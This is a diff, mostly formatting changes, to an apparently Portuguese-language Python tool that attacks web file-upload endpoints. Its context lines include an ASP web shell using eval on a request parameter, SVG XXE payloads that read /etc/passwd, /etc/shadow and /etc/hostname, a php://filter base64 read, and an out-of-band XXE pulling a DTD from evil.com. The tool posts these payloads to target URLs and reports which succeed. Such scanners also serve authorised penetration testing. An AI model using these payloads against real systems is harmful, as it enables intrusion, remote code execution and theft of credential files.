@@ -124,7 +124,9 @@ def _load_category_map() -> dict[str, list[str]]:
 
     from mytools.data import load_payloads
 
-    data = load_payloads("web", "fileupload", default={"category_map": _CATEGORY_MAP_DEFAULT})
+    data = load_payloads(
+        "web", "fileupload", default={"category_map": _CATEGORY_MAP_DEFAULT}
+    )
 
     return data.get("category_map", _CATEGORY_MAP_DEFAULT)
 
@@ -138,7 +140,9 @@ _ASP_SHELL = b'<% eval(Request("c")) %>'
 
 _ELF_HEADER = b"\x7fELF\x02\x01\x01\x00"
 
-_SVG_OPEN = b'<?xml version="1.0" encoding="UTF-8"?>\n<svg xmlns="http://www.w3.org/2000/svg">'
+_SVG_OPEN = (
+    b'<?xml version="1.0" encoding="UTF-8"?>\n<svg xmlns="http://www.w3.org/2000/svg">'
+)
 
 _XXE_DTD = b'<!DOCTYPE svg [\n<!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n'
 
@@ -200,28 +204,34 @@ _SVG_XXE_PAYLOADS: list[tuple[str, str, bytes, str, list[str]]] = [
     (
         "xxe_file_read",
         "xxe_file_read.svg",
-        _SVG_OPEN + b"\n" + _XXE_DTD.replace(b"passwd", b"shadow") + b"<text>&xxe;</text>\n</svg>",
+        _SVG_OPEN
+        + b"\n"
+        + _XXE_DTD.replace(b"passwd", b"shadow")
+        + b"<text>&xxe;</text>\n</svg>",
         "image/svg+xml",
         ["xxe", "shadow"],
     ),
     (
         "xxe_ssi",
         "xxe_ssi.svg",
-        _SVG_OPEN + b'\n<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>\n<text>&xxe;</text>\n</svg>',
+        _SVG_OPEN
+        + b'\n<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>\n<text>&xxe;</text>\n</svg>',
         "image/svg+xml",
         ["xxe", "hostname"],
     ),
     (
         "xxe_oob",
         "xxe_oob.svg",
-        _SVG_OPEN + b'\n<!DOCTYPE svg [<!ENTITY % dtd SYSTEM "http://evil.com/xxe.dtd">%dtd;]>\n</svg>',
+        _SVG_OPEN
+        + b'\n<!DOCTYPE svg [<!ENTITY % dtd SYSTEM "http://evil.com/xxe.dtd">%dtd;]>\n</svg>',
         "image/svg+xml",
         ["xxe", "evil.com"],
     ),
     (
         "xxe_cdata",
         "xxe_cdata.svg",
-        _SVG_OPEN + b'\n<!DOCTYPE svg [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>\n<text>&xxe;</text>\n</svg>',
+        _SVG_OPEN
+        + b'\n<!DOCTYPE svg [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>\n<text>&xxe;</text>\n</svg>',
         "image/svg+xml",
         ["xxe", "php://filter"],
     ),
@@ -919,7 +929,13 @@ async def _test_content_type_category(
 
     results: list[UploadAttempt] = []
 
-    for technique, filename, content, content_type, indicators in _CONTENT_TYPE_PAYLOADS:
+    for (
+        technique,
+        filename,
+        content,
+        content_type,
+        indicators,
+    ) in _CONTENT_TYPE_PAYLOADS:
         try:
             resp = await client.post(
                 url,
@@ -1000,13 +1016,19 @@ async def _test_multipart_boundary_category(
                 resp = await client.post(
                     url,
                     content=f'------{boundary}\r\nContent-Disposition: form-data; name="{field_name}"\r\n\r\ntest\r\n------{boundary}--\r\n'.encode(),
-                    headers={"Content-Type": f"multipart/form-data; boundary=------{boundary}"},
+                    headers={
+                        "Content-Type": f"multipart/form-data; boundary=------{boundary}"
+                    },
                     timeout=timeout,
                 )
 
             body_str = resp.text
 
-            reflected = _check_upload_reflection(body_str, indicators) if indicators else resp.status_code != b_status
+            reflected = (
+                _check_upload_reflection(body_str, indicators)
+                if indicators
+                else resp.status_code != b_status
+            )
 
             results.append(
                 UploadAttempt(
@@ -1078,9 +1100,16 @@ def print_results(result: UploadResult) -> None:
 
     print(color(f"  TLS:          {'sim' if result.tls else 'nao'}", Cyber.WHITE))
 
-    print(color(f"  Upload:       {result.upload_endpoint or 'auto-detect'}", Cyber.WHITE))
+    print(
+        color(f"  Upload:       {result.upload_endpoint or 'auto-detect'}", Cyber.WHITE)
+    )
 
-    print(color(f"  Baseline:     {result.baseline_status} ({result.baseline_size} bytes)", Cyber.WHITE))
+    print(
+        color(
+            f"  Baseline:     {result.baseline_status} ({result.baseline_size} bytes)",
+            Cyber.WHITE,
+        )
+    )
 
     print(color(f"  Testes:       {len(result.attempts)}", Cyber.WHITE))
 
@@ -1112,10 +1141,19 @@ def print_results(result: UploadResult) -> None:
 
             print_exploit_info(a.exploit, a.tool)
 
-        print(color(f"\n  Total: {len(vuln)} vulneraveis de {len(result.attempts)} testes", Cyber.WHITE))
+        print(
+            color(
+                f"\n  Total: {len(vuln)} vulneraveis de {len(result.attempts)} testes",
+                Cyber.WHITE,
+            )
+        )
 
     else:
-        print(color("\n  [+] Nenhuma vulnerabilidade de File Upload detectada", Cyber.GREEN))
+        print(
+            color(
+                "\n  [+] Nenhuma vulnerabilidade de File Upload detectada", Cyber.GREEN
+            )
+        )
 
     if result.issues:
         print(color("\n  [!] Observacoes:", Cyber.YELLOW))
@@ -1138,7 +1176,9 @@ async def run_scan(
 
     async with create_async_client(timeout=timeout) as client:
         try:
-            b_status, _b_headers, b_body, _b_raw = await fetch(client, target, timeout=timeout)
+            b_status, _b_headers, b_body, _b_raw = await fetch(
+                client, target, timeout=timeout
+            )
 
             b_size = len(b_body)
 
@@ -1160,12 +1200,16 @@ async def run_scan(
 
             if tester:
                 all_attempts.extend(
-                    await tester(client, upload_endpoint or target, timeout, b_status, b_size),
+                    await tester(
+                        client, upload_endpoint or target, timeout, b_status, b_size
+                    ),
                 )
 
         vuln_techs = list({a.technique for a in all_attempts if a.vulnerable})
 
-        blocked_techs = list({a.technique for a in all_attempts if not a.vulnerable and not a.error})
+        blocked_techs = list(
+            {a.technique for a in all_attempts if not a.vulnerable and not a.error}
+        )
 
         issues: list[str] = []
 
@@ -1185,7 +1229,9 @@ async def run_scan(
             vulnerable_techniques=vuln_techs,
             blocked_techniques=blocked_techs,
             issues=issues,
-            overall_status="vulnerable" if vuln_techs else ("safe" if blocked_techs else "unknown"),
+            overall_status="vulnerable"
+            if vuln_techs
+            else ("safe" if blocked_techs else "unknown"),
         )
 
         print_results(result)
@@ -1227,7 +1273,10 @@ def banner_art() -> None:
 
 """
 
-    create_banner(art, "   fileupload: polyglot, svg_xxe, image_magic, zip_slip, filename, content_type, boundary")()
+    create_banner(
+        art,
+        "   fileupload: polyglot, svg_xxe, image_magic, zip_slip, filename, content_type, boundary",
+    )()
 
 
 def build_parser() -> argparse.ArgumentParser:
@@ -1253,7 +1302,16 @@ def build_parser() -> argparse.ArgumentParser:
         "-c",
         "--category",
         default="all",
-        choices=["all", "polyglot", "svg_xxe", "image_magic", "zip_slip", "filename_inject", "content_type", "multipart_boundary"],
+        choices=[
+            "all",
+            "polyglot",
+            "svg_xxe",
+            "image_magic",
+            "zip_slip",
+            "filename_inject",
+            "content_type",
+            "multipart_boundary",
+        ],
         help="Categoria de testes (default: todas)",
     )
 
@@ -1289,7 +1347,9 @@ def main() -> int:
         parser=build_parser(),
         banner_fn=banner_art,
         run_fn=run_once,
-        has_target=lambda a: bool(getattr(a, "url", None) or getattr(a, "target", None)),
+        has_target=lambda a: bool(
+            getattr(a, "url", None) or getattr(a, "target", None)
+        ),
         prompt="fileupload> ",
         description="File Upload Attacks interativo.",
         example="https://target.com/upload -c polyglot",
